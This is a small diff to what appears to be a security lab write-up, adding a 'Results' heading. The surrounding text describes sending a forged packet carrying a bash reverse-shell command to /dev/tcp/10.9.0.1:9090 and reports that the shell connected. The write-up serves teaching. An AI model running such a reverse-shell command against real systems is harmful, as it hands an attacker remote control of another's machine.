@@ -334,6 +334,7 @@ Listening on 0.0.0.0 9090
 
 We then send the forged packet and see if the shell connects to our machine, remembering to add carriage return (`\r`) and newline (`\n`) to be sure that the command is executed on the server: `data = "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1\r\n"`
 
+### Results
 We did everything correctly and the reverse shell connected succesfully.
 
 ```bash
